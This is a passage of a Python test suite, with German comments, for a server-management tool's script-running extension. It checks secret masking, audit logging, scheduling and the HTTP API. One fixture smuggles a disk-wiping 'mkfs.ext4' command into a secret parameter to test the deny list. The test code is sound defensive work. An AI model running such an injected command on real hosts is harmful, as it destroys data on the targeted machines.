    executed = await _ScriptActionExecutor(ctx, ext._repo).execute(
        ActionRequest(
            action_type="script.run", host_ref=host.id, payload=dict(action.payload), risk=Risk.HIGH,
            proposed_by=Actor.extension("scripts"), reason="test",
        )
    )
    assert executed.success is True
    assert opened == 1
    assert seen == [0], "beim Ausfuehren darf kein vault_use-Block mehr offen sein"


@pytest.mark.asyncio
async def test_deny_pattern_hit_on_the_real_command_keeps_the_secret_out_of_the_audit_log(
    tmp_path, db_session, settings_bound
):
    """Greift die Sperrliste erst beim eingesetzten Geheimnis, steht in der Audit-Zeile
    die maskierte Fassung -- und die Ausfuehrung scheitert ohne Klartext."""
    _runtime, ctx, ext = await _setup_scripts_extension(tmp_path, settings_bound)
    from nodvard_deck_ext_scripts import _ScriptActionExecutor, run_script
    from nodvard_sdk import ActionRequest, Actor, Risk

    secret = "x; mkfs.ext4 /dev/sdz"
    host, _meta = await _secret_script(ctx, ext, db_session, content="echo $api_key\n", secret_value=secret)
    result = await run_script(ctx, ext._repo, "secret-script", param_overrides={})
    action = await db_session.get(Action, result["results"][0]["action_id"])
    assert secret not in str(action.payload)

    executed = await _ScriptActionExecutor(ctx, ext._repo).execute(
        ActionRequest(
            action_type="script.run", host_ref=host.id, payload=dict(action.payload), risk=Risk.HIGH,
            proposed_by=Actor.extension("scripts"), reason="test",
        )
    )
    assert executed.success is False
    assert "mkfs" in executed.error and secret not in executed.error
    rows = (await db_session.execute(select(AuditEntry).where(AuditEntry.action == "exec.denied"))).scalars().all()
    assert len(rows) == 1
    assert rows[0].detail["command"] == action.payload["command"]
    assert "••••" in rows[0].detail["command"]
    for row in (await db_session.execute(select(AuditEntry))).scalars().all():
        assert secret not in f"{row.detail} {row.reason}"


@pytest.mark.asyncio
async def test_run_script_refuses_a_secret_value_passed_in_the_call(tmp_path, db_session, settings_bound):
    from nodvard_sdk.errors import NodvardError

    _runtime, ctx, ext = await _setup_scripts_extension(tmp_path, settings_bound)
    from nodvard_deck_ext_scripts import run_script

    await _secret_script(ctx, ext, db_session)
    with pytest.raises(NodvardError, match="api_key"):
        await run_script(ctx, ext._repo, "secret-script", param_overrides={"api_key": "mitgegeben-123"})
    assert (await db_session.execute(select(Action))).scalars().all() == []


@pytest.mark.asyncio
async def test_script_without_secrets_keeps_the_command_as_before(tmp_path, db_session, settings_bound, monkeypatch):
    """Ohne geheime Parameter steht der fertige Befehl im Payload und wird unveraendert
    ausgefuehrt -- auch dann, wenn das Skript inzwischen anders aussieht (wie bisher)."""
    _runtime, ctx, ext = await _setup_scripts_extension(tmp_path, settings_bound)
    from nodvard_deck_ext_scripts import _ScriptActionExecutor, run_script
    from nodvard_deck_ext_scripts.repo import ScriptMeta
    from nodvard_sdk import ActionRequest, Actor, Risk

    host = await hosts_service.create_host(db_session, name="h1", address="10.0.0.1")
    await db_session.commit()
    ext._repo.save(
        ScriptMeta(
            id="plain", name="Plain", params_schema={"name": {"type": "string", "default": "x"}},
            target={"kind": "host", "host_id": host.id}, enabled=True,
        ),
        "echo $name\n", commit_message="plain angelegt",
    )
    commands = _capture_exec(monkeypatch, ctx)
    result = await run_script(ctx, ext._repo, "plain", param_overrides={"name": "welt"})
    action = await db_session.get(Action, result["results"][0]["action_id"])
    assert action.payload["command"] == "echo welt\n"
    assert action.payload["secret_params"] == []

    executed = await _ScriptActionExecutor(ctx, ext._repo).execute(
        ActionRequest(
            action_type="script.run", host_ref=host.id, payload=dict(action.payload), risk=Risk.HIGH,
            proposed_by=Actor.extension("scripts"), reason="test",
        )
    )
    assert executed.success is True
    assert commands == ["echo welt\n"]


@pytest.mark.asyncio
async def test_run_script_rejects_disabled_script(tmp_path, db_session, settings_bound):
    from nodvard_sdk.errors import NodvardError

    _runtime, ctx, ext = await _setup_scripts_extension(tmp_path, settings_bound)
    from nodvard_deck_ext_scripts import run_script
    from nodvard_deck_ext_scripts.repo import ScriptMeta

    ext._repo.save(
        ScriptMeta(id="draft", name="Entwurf", enabled=False), "echo hi\n", commit_message="draft angelegt"
    )

    with pytest.raises(NodvardError, match="deaktiviert"):
        await run_script(ctx, ext._repo, "draft", param_overrides={})


@pytest.mark.asyncio
async def test_scheduled_job_handler_is_registered_and_runnable(tmp_path, db_session, settings_bound):
    """Der geplante Lauf (Kern-Scheduler, kein manueller Trigger) nutzt denselben
    Handler, den `register_job()` im Extension-Registry hinterlegt hat -- wie
    proxmoxs `_run_discovery()`-Testhilfe fuer die Discovery-Job. Nutzt die LOKALE
    `runtime` aus `_setup_scripts_extension()` (wie test_ext_terminal.py), NICHT den
    globalen `get_extension_runtime()`-Singleton -- dieser Test laedt die Extension
    per `build_context()` direkt, nicht ueber die echte `enable_extension()`, die
    tatsaechlich in den globalen Singleton registriert (siehe proxmoxs HTTP-Tests
    unten). Das Skript liegt schon im Repo, bevor `setup()` (Boot) laeuft."""
    _runtime1, _ctx1, ext1 = await _setup_scripts_extension(tmp_path, settings_bound)
    from nodvard_deck_ext_scripts.repo import ScriptMeta

    ext1._repo.save(
        ScriptMeta(id="nightly", name="Nachts", target={"kind": "all"}, schedule="0 1 * * *", enabled=True),
        "echo hi\n",
        commit_message="nightly angelegt",
    )
    runtime, _ctx, _ext = await _setup_scripts_extension(tmp_path, settings_bound)

    handler = runtime.scheduler.get("scripts", "script-nightly")
    assert handler is not None

    result = await handler()
    assert result["script_id"] == "nightly"
    assert result["targets"] == 0  # keine Hosts angelegt in diesem Test


@pytest.mark.asyncio
async def test_recurring_action_executed_events_promote_a_disabled_draft_script(tmp_path, db_session, settings_bound):
    """docs/02 Paragraph 6, letzte Zeile: `ctx.events.subscribe('action.executed')`
    soll nach mehrfacher identischer Ausfuehrung einen Skript-Entwurf anlegen -- ueber
    den Event-Bus, ohne dass diese Extension die vorschlagende Extension (z. B.
    nexus-soc) kennt."""
    _runtime, ctx, ext = await _setup_scripts_extension(tmp_path, settings_bound)
    from nodvard_deck_ext_scripts.promotion import MAX_COUNT

    before = set(ext._repo.list_ids())

    for _ in range(MAX_COUNT):
        await get_event_bus().publish(
            Event(
                name="action.executed",
                payload={
                    "action_type": "shell.exec", "host_id": "host-xyz", "outcome": "success",
                    "payload": {"command": "docker restart nginx-proxy"},
                },
            )
        )

    after = set(ext._repo.list_ids())
    new_ids = after - before
    assert len(new_ids) == 1
    draft = ext._repo.get(next(iter(new_ids)))
    assert draft.meta.enabled is False  # Kill-Switch: erst nach Pruefung aktivierbar
    assert "docker restart nginx-proxy" in draft.content

    # Eine VIERTE Wiederholung darf KEINEN zweiten Entwurf fuer denselben Befehl anlegen.
    await get_event_bus().publish(
        Event(
            name="action.executed",
            payload={
                "action_type": "shell.exec", "host_id": "host-xyz", "outcome": "success",
                "payload": {"command": "docker restart nginx-proxy"},
            },
        )
    )
    assert set(ext._repo.list_ids()) - before == new_ids


@pytest.mark.asyncio
async def test_promotion_notice_does_not_contain_the_command(tmp_path, db_session, settings_bound):
    """Meldungen liest auch, wer nur ansehen darf: der Befehl (evtl. mit Passwort) steht nur im
    Entwurf auf der Skripte-Seite, nicht im Meldungstext."""
    _runtime, _ctx, _ext = await _setup_scripts_extension(tmp_path, settings_bound)
    from nodvard_deck_ext_scripts.promotion import MAX_COUNT

    command = "mysql -u root -pGEHEIM123 -e 'flush logs'"
    for _ in range(MAX_COUNT):
        await get_event_bus().publish(
            Event(
                name="action.executed",
                payload={
                    "action_type": "shell.exec", "host_id": "host-xyz", "outcome": "success",
                    "payload": {"command": command},
                },
            )
        )

    from nodvard_deck.models import Notification as NotificationRow

    notes = (
        await db_session.execute(select(NotificationRow).where(NotificationRow.title == "Wiederkehrende Reparatur erkannt"))
    ).scalars().all()
    assert notes  # (Handler frueherer Tests am globalen Bus koennen weitere Meldungen anlegen)
    for note in notes:
        assert "GEHEIM123" not in note.body and "GEHEIM123" not in str(note.payload)
        assert note.payload == {"path": "/ext/scripts/scripts"}


@pytest.mark.asyncio
async def test_own_script_run_executions_are_never_promoted(tmp_path, db_session, settings_bound):
    """Sonst wuerde ein bereits befoerdertes, wiederkehrend geplantes Skript sich
    selbst immer wieder neu vorschlagen -- siehe promotion.py-Docstring."""
    _runtime, ctx, ext = await _setup_scripts_extension(tmp_path, settings_bound)
    from nodvard_deck_ext_scripts.promotion import MAX_COUNT

    before = set(ext._repo.list_ids())

    for _ in range(MAX_COUNT + 3):
        await get_event_bus().publish(
            Event(
                name="action.executed",
                payload={
                    "action_type": "script.run", "host_id": "host-xyz", "outcome": "success",
                    "payload": {"command": "lynis audit system --quick --quiet"},
                },
            )
        )

    assert set(ext._repo.list_ids()) == before


@pytest.mark.asyncio
async def test_real_ssh_execution_end_to_end_with_full_autonomy(
    tmp_path, db_session, settings_bound, local_ssh_server
):
    """Volle Kette: Skript -> Parametersubstitution -> Gate (autonomy.mode=full) ->
    ECHTER lokaler SSH-Server (wie test_ext_terminal.py) -- beweist, dass `script.run`
    denselben `ctx.exec`-Ausfuehrungsweg wie `shell.exec` tatsaechlich erreicht.

    **Live gefunden beim Schreiben dieses Tests:** `core.gate.find_executor()` fragt
    IMMER den GLOBALEN `get_extension_runtime()`-Singleton ab (siehe gate.py), nicht
    irgendeine lokale `ExtensionRuntime()`-Instanz. Der sonst in dieser Datei genutzte
    schnelle Testaufbau (wie test_ext_terminal.py: eine frische, lokale
    `ExtensionRuntime()` direkt an `build_context()` uebergeben) registriert den
    ActionExecutor deshalb an einer Stelle, die das Gate bei `autonomy.mode=full`
    (das intern `execute_action()` und damit `find_executor()` aufruft) niemals
    findet -- Ergebnis waere "Kein ActionExecutor fuer 'script.run'." Fuer EXAKT
    diesen einen End-zu-Ende-Fall wird deshalb bewusst der globale Singleton
    durchgereicht (wie es `services.extensions.enable_extension()` in Produktion
    auch tut), mit sauberem Reset davor/danach."""
    reset_extension_runtime()
    try:
        host_addr, port, username, password, _sftp_root = local_ssh_server
        host = await hosts_service.create_host(db_session, name="ssh-host", address=host_addr)
        await hosts_service.add_credential(
            db_session, settings_bound, host_id=host.id, kind="ssh_password",
            username=username, port=port, secret_value=password,
        )
        await settings_service.set_global(db_session, "autonomy.mode", "full")
        await settings_service.set_global(db_session, "autonomy.max_risk", "high")
        await db_session.commit()

        _runtime, ctx, ext = await _setup_scripts_extension(
            tmp_path, settings_bound, runtime=get_extension_runtime()
        )
        from nodvard_deck_ext_scripts import run_script
        from nodvard_deck_ext_scripts.repo import ScriptMeta

        ext._repo.save(
            ScriptMeta(id="echo-test", name="Echo-Test", target={"kind": "host", "host_id": host.id}, enabled=True),
            "echo hello-from-script\n",
            commit_message="echo-test angelegt",
        )

        result = await run_script(ctx, ext._repo, "echo-test", param_overrides={})
        action = await db_session.get(Action, result["results"][0]["action_id"])
        assert action.status == "succeeded", action.result
        assert "ran:echo hello-from-script" in action.result["output"]
        listed = await ctx.actions.list(correlation_id="script:echo-test")
        assert [a.id for a in listed] == [action.id], "actions.list() findet den Lauf ueber die correlation_id"
    finally:
        reset_extension_runtime()


# --- Ueber die echte HTTP-API (Boot/Enable/CRUD), wie test_ext_proxmox.py ----------


async def _bootstrap_owner(client, username="owner1", password="correct-horse-battery"):
    await client.post("/api/v1/auth/bootstrap", json={"username": username, "password": password, "setup_code": "TEST-CODE-2345"})
    login = await client.post("/api/v1/auth/login", json={"username": username, "password": password})
    assert login.status_code == 200, login.text
    return login.json()["access_token"]


def _auth_header(token: str) -> dict:
    return {"Authorization": f"Bearer {token}"}


async def _enable_scripts(client, db_session, test_settings) -> str:
    test_settings.extensions_dir = REPO_EXTENSIONS_DIR
    await extensions_service.discover_and_sync(db_session, test_settings)
    token = await _bootstrap_owner(client)
    enabled = await client.post("/api/v1/extensions/scripts/enable", headers=_auth_header(token))
    assert enabled.status_code == 200, enabled.text
    assert enabled.json()["state"] == "enabled"
    return token


@pytest.mark.asyncio
async def test_extension_enables_via_real_manifest_purity_and_schedules_saved_script_over_http(
    client, db_session, test_settings
):
    token = await _enable_scripts(client, db_session, test_settings)
    headers = _auth_header(token)

    listed = await client.get("/api/v1/ext/scripts/scripts", headers=headers)
    assert listed.status_code == 200, listed.text
    assert listed.json() == []  # kein vorab angelegtes Lynis-Skript mehr

    record = await db_session.get(ExtensionRecord, "scripts")
    assert record.state == "enabled"

    saved = await client.put(
        "/api/v1/ext/scripts/scripts/nightly",
        json={"name": "Nachts", "content": "echo hi\n", "schedule": "0 1 * * *", "enabled": True, "target": {"kind": "all"}},
        headers=headers,
    )
    assert saved.status_code == 200, saved.text
    assert saved.json()["job_id"] == "script-nightly"

    job = (
        await db_session.execute(select(Job).where(Job.ext_id == "scripts", Job.ext_job_key == "script-nightly"))
    ).scalar_one()
    assert job.enabled is True
    assert job.schedule == "0 1 * * *"


@pytest.mark.asyncio
async def test_save_get_update_delete_roundtrip_over_http(client, db_session, test_settings):
    token = await _enable_scripts(client, db_session, test_settings)
    headers = _auth_header(token)

    created = await client.put(
        "/api/v1/ext/scripts/scripts/my-script",
        json={"name": "Mein Skript", "content": "echo v1\n", "enabled": True, "target": {"kind": "all"}},
        headers=headers,
    )
    assert created.status_code == 200, created.text
    assert created.json()["content"] == "echo v1\n"

    updated = await client.put(
        "/api/v1/ext/scripts/scripts/my-script",
        json={"name": "Mein Skript", "content": "echo v2\n", "enabled": True, "target": {"kind": "all"}},
        headers=headers,
    )
    assert updated.status_code == 200
    assert updated.json()["content"] == "echo v2\n"

    history = await client.get("/api/v1/ext/scripts/scripts/my-script/history", headers=headers)
    assert history.status_code == 200
    assert len(history.json()) == 2

    deleted = await client.delete("/api/v1/ext/scripts/scripts/my-script", headers=headers)
    assert deleted.status_code == 204

    missing = await client.get("/api/v1/ext/scripts/scripts/my-script", headers=headers)
    assert missing.status_code == 404


@pytest.mark.asyncio
async def test_save_rejects_group_or_host_target_without_selection_over_http(client, db_session, test_settings):
    """'Einer Gruppe' ohne Auswahl wurde still gespeichert (und lief dann
    auf allen Servern); 'Einem Server' ohne Auswahl hatte gar kein Ziel."""
    token = await _enable_scripts(client, db_session, test_settings)
    headers = _auth_header(token)
    url = "/api/v1/ext/scripts/scripts/zielpruefung"

    for target, needle in (
        ({"kind": "group"}, "Gruppe"),
        ({"kind": "group", "group_id": None}, "Gruppe"),
        ({"kind": "host", "host_id": None}, "Server"),
        ({"kind": "host"}, "Server"),
        ({"kind": "irgendwas"}, "Ziel"),
    ):
        r = await client.put(url, json={"name": "Z", "content": "echo hi\n", "target": target}, headers=headers)
        assert r.status_code == 422, (target, r.text)
        assert needle in r.json()["detail"], (target, r.text)
    assert (await client.get(url, headers=headers)).status_code == 404  # nichts gespeichert

    group_id = (await client.post("/api/v1/host-groups", json={"name": "fleet"}, headers=headers)).json()["id"]
    ok = await client.put(
        url, json={"name": "Z", "content": "echo hi\n", "target": {"kind": "group", "group_id": group_id}}, headers=headers,
    )
    assert ok.status_code == 200, ok.text
    all_hosts = await client.put(url, json={"name": "Z", "content": "echo hi\n", "target": {"kind": "all"}}, headers=headers)
    assert all_hosts.status_code == 200, all_hosts.text


@pytest.mark.asyncio
async def test_saving_with_a_single_host_target_forgets_the_skip_state(client, db_session, test_settings):
    """Wechselt ein Skript von 'Alle Server' auf einen einzelnen Server, wird der alte
    Meldestand vergessen (sonst unterdrückt er beim Rückwechsel eine erwartete Meldung)."""
    token = await _enable_scripts(client, db_session, test_settings)
    headers = _auth_header(token)
    url = "/api/v1/ext/scripts/scripts/wechsel"
    body = {"name": "W", "content": "echo hi\n", "target": {"kind": "all"}}
    assert (await client.put(url, json=body, headers=headers)).status_code == 200

    state_files = list(test_settings.ext_data_dir.rglob("skip-notices.json"))
    assert state_files == []
    from nodvard_deck_ext_scripts.skipnotice import SkipNotices

    ext_data = next(test_settings.ext_data_dir.glob("scripts"))
    notices = SkipNotices(ext_data / "skip-notices.json")
    notices.update("wechsel", {"h1": "keine SSH-Zugangsdaten"})
    assert notices.update("wechsel", {"h1": "keine SSH-Zugangsdaten"}) == ({}, {"h1": "keine SSH-Zugangsdaten"})

    body["target"] = {"kind": "all"}
    assert (await client.put(url, json=body, headers=headers)).status_code == 200
    assert notices.update("wechsel", {"h1": "keine SSH-Zugangsdaten"})[0] == {}  # Sammelziel: bleibt

    host = (await client.post("/api/v1/hosts", json={"name": "h", "address": "10.0.0.9"}, headers=headers)).json()
    body["target"] = {"kind": "host", "host_id": host["id"]}
    assert (await client.put(url, json=body, headers=headers)).status_code == 200
    assert notices.update("wechsel", {"h1": "keine SSH-Zugangsdaten"})[0] == {"h1": "keine SSH-Zugangsdaten"}


@pytest.mark.asyncio
async def test_creating_a_script_with_an_existing_id_is_rejected_over_http(client, db_session, test_settings):
    """'Neues Skript' mit schon vergebener Kennung ueberschrieb frueher
    still das bestehende Skript samt Ziel und Zeitplan. Neu angelegte Skripte kommen
    mit ?create=true -- ist die Kennung vergeben, antwortet das Backend mit 409."""
    token = await _enable_scripts(client, db_session, test_settings)
    headers = _auth_header(token)
    url = "/api/v1/ext/scripts/scripts/backup"
    original = {"name": "Backup", "content": "tar czf /tmp/b.tgz /etc\n", "schedule": "0 3 * * *", "target": {"kind": "all"}}

    created = await client.put(f"{url}?create=true", json=original, headers=headers)
    assert created.status_code == 200, created.text

    again = await client.put(
        f"{url}?create=true", json={"name": "Backup", "content": "#!/bin/sh\n", "target": {"kind": "all"}}, headers=headers,
    )
    assert again.status_code == 409, again.text
    assert "backup" in again.json()["detail"]
    assert "gibt es schon" in again.json()["detail"]

    kept = (await client.get(url, headers=headers)).json()
    assert kept["content"] == "tar czf /tmp/b.tgz /etc\n"
    assert kept["schedule"] == "0 3 * * *"
    assert len((await client.get(f"{url}/history", headers=headers)).json()) == 1

    # Bearbeiten (ohne create) aktualisiert weiterhin.
    updated = await client.put(url, json={**original, "content": "echo neu\n"}, headers=headers)
    assert updated.status_code == 200, updated.text
    assert updated.json()["content"] == "echo neu\n"


@pytest.mark.asyncio
async def test_widget_data_endpoint_returns_the_wrapped_envelope_not_the_raw_list(
    client, db_session, test_settings
):
    """Live gefunden im Dashboard-Boot-Test: `GET /scripts` (roh, fuer ScriptsPage.tsx)
    kann NICHT direkt als `WidgetSpec.data_endpoint` dienen -- der generische
    Widget-Vertrag verlangt `{"data": ..., "meta": {}}` (siehe proxmoxs
    `overview_widget_data()`); ohne den eigenen `/widgets/overview`-Endpunkt zeigte
    das Dashboard 'Extension-Fehler: Antwort hat keine "data"-Eigenschaft.'"""
    token = await _enable_scripts(client, db_session, test_settings)
    headers = _auth_header(token)
    await client.put(
        "/api/v1/ext/scripts/scripts/nightly",
        json={"name": "Nachts", "content": "echo hi\n", "schedule": "0 1 * * *", "enabled": True, "target": {"kind": "all"}},
        headers=headers,
    )

    widget = await client.get("/api/v1/ext/scripts/widgets/overview", headers=headers)
    assert widget.status_code == 200, widget.text
    body = widget.json()
    assert "data" in body and "meta" in body
    assert {"name": "Nachts", "schedule": "0 1 * * *"} in body["data"]

    raw_list = await client.get("/api/v1/ext/scripts/scripts", headers=headers)
    assert isinstance(raw_list.json(), list)  # ScriptsPage.tsx braucht weiterhin die rohe Liste


@pytest.mark.asyncio
async def test_run_endpoint_rejects_unknown_and_disabled_scripts_over_http(client, db_session, test_settings):
    token = await _enable_scripts(client, db_session, test_settings)
    headers = _auth_header(token)

    missing = await client.post(
        "/api/v1/ext/scripts/scripts/does-not-exist/run", json={"param_overrides": {}}, headers=headers
    )
    assert missing.status_code == 404

    await client.put(
        "/api/v1/ext/scripts/scripts/off-script",
        json={"name": "Aus", "content": "echo hi\n", "enabled": False, "target": {"kind": "all"}},
        headers=headers,
    )
    disabled = await client.post(
        "/api/v1/ext/scripts/scripts/off-script/run", json={"param_overrides": {}}, headers=headers
    )
    assert disabled.status_code == 409


@pytest.mark.asyncio
async def test_runs_endpoint_lists_runs_with_host_and_who_clicked(client, db_session, test_settings):
    """Nach "Ausfuehren" sieht man die Laeufe des Skripts -- mit Ziel-Host und dem
    klickenden Nutzer (D-15), bei autonomy=propose zunaechst als Vorschlag."""
    token = await _enable_scripts(client, db_session, test_settings)
    headers = _auth_header(token)
    host_id = (await client.post("/api/v1/hosts", json={"name": "pi", "address": "10.0.0.9"}, headers=headers)).json()["id"]
    await client.put(
        "/api/v1/ext/scripts/scripts/uptime",
        json={"name": "Uptime", "content": "uptime\n", "enabled": True, "target": {"kind": "host", "host_id": host_id}},
        headers=headers,
    )
    assert (await client.get("/api/v1/ext/scripts/scripts/uptime/runs", headers=headers)).json() == []
    run = await client.post("/api/v1/ext/scripts/scripts/uptime/run", json={"param_overrides": {}}, headers=headers)
    assert run.status_code == 200, run.text

    runs = (await client.get("/api/v1/ext/scripts/scripts/uptime/runs", headers=headers)).json()
    assert len(runs) == 1
    assert runs[0]["status"] == "proposed"
    assert runs[0]["host_name"] == "pi"
    assert runs[0]["proposed_by"].startswith("user/")
    assert runs[0]["proposed_by_label"] == "owner1", "Name statt user/<uuid>"
    assert (await client.get("/api/v1/ext/scripts/scripts/nope/runs", headers=headers)).status_code == 404


@pytest.mark.asyncio
async def test_script_run_is_not_offered_as_raw_command_form_on_the_host_page(client, db_session, test_settings):
    """script.run war host-gebunden -- die Server-Seite bot es deshalb unter
    "Weitere Aktionen" als Formular mit freiem Feld "command" an. Skripte startet man
    ueber die Skript-Seite (bzw. das Host-Werkzeug "Skripte"); das Gate braucht
    host_bound nicht."""
    token = await _enable_scripts(client, db_session, test_settings)
    headers = _auth_header(token)
    host_id = (await client.post("/api/v1/hosts", json={"name": "pi", "address": "10.0.0.9"}, headers=headers)).json()["id"]

    assert get_extension_runtime().actions.get("script.run") is not None  # weiterhin registriert
    offered = await client.get(f"/api/v1/hosts/{host_id}/actions", headers=headers)
    assert offered.status_code == 200, offered.text
    assert "script.run" not in {a["action_type"] for a in offered.json()}


@pytest.mark.asyncio
async def test_secret_never_shows_in_actions_api_events_or_runs_over_http(
    client, db_session, test_settings, monkeypatch
):
    """Geheimer Parameter End-zu-Ende (autonomy=full): Der Tresor-Wert erreicht nur den
    Ausfuehrungsweg -- Aktion, GET /actions, Ereignis 'action.executed' und die Laeufe-
    Ansicht enthalten ihn nie."""
    from nodvard_deck.core import vault
    from nodvard_deck.db.session import session_scope
    from nodvard_deck.ext.context import ExecHandle
    from nodvard_sdk.types import ExecResult

    reset_extension_runtime()
    try:
        token = await _enable_scripts(client, db_session, test_settings)
        headers = _auth_header(token)
        async with session_scope() as session:
            await vault.create_secret(
                session, vault.load_keyring(test_settings), label="scripts-geheim-api_key", kind="generic",
                plaintext="s3cr3t-value", owner_ext_id="scripts",
            )
        host_id = (await client.post("/api/v1/hosts", json={"name": "pi", "address": "10.0.0.9"}, headers=headers)).json()["id"]
        saved = await client.put(
            "/api/v1/ext/scripts/scripts/geheim",
            json={
                "name": "Geheim", "content": "curl -H 'X-Key: $api_key' https://example.invalid\n", "enabled": True,
                "params_schema": {"api_key": {"type": "secret"}},
                "target": {"kind": "host", "host_id": host_id},
            },
            headers=headers,
        )
        assert saved.status_code == 200, saved.text
        await settings_service.set_global(db_session, "autonomy.mode", "full")
        await settings_service.set_global(db_session, "autonomy.max_risk", "high")
        await db_session.commit()

        commands: list[str] = []

        async def _run(self, host, command, *, timeout_s=60, user=None, log_command=None):
            commands.append(command)
            return ExecResult(exit_code=0, stdout="fertig", stderr="", duration_ms=1)

        monkeypatch.setattr(ExecHandle, "run", _run)
        events: list[Event] = []

        async def _collect(event: Event) -> None:
            events.append(event)

        get_event_bus().subscribe("action.*", _collect)
        try:
            run = await client.post(
                "/api/v1/ext/scripts/scripts/geheim/run", json={"param_overrides": {}}, headers=headers
            )
        finally:
            get_event_bus().unsubscribe("action.*", _collect)
        assert run.status_code == 200, run.text
        assert commands == ["curl -H 'X-Key: s3cr3t-value' https://example.invalid\n"]

        action_id = run.json()["results"][0]["action_id"]
        outputs = [
            run.text,
            (await client.get("/api/v1/actions", headers=headers)).text,
            (await client.get(f"/api/v1/actions/{action_id}", headers=headers)).text,
            (await client.get("/api/v1/ext/scripts/scripts/geheim/runs", headers=headers)).text,
            str([e.model_dump() for e in events]),
        ]
        executed = [e for e in events if e.name == "action.executed"]
        assert executed, "das Ereignis muss ueberhaupt gekommen sein"
        for text in outputs:
            assert "s3cr3t-value" not in text
        assert "••••" in outputs[2]
        stored = await db_session.get(Action, action_id)
        assert stored.status == "succeeded"
    finally:
        reset_extension_runtime()
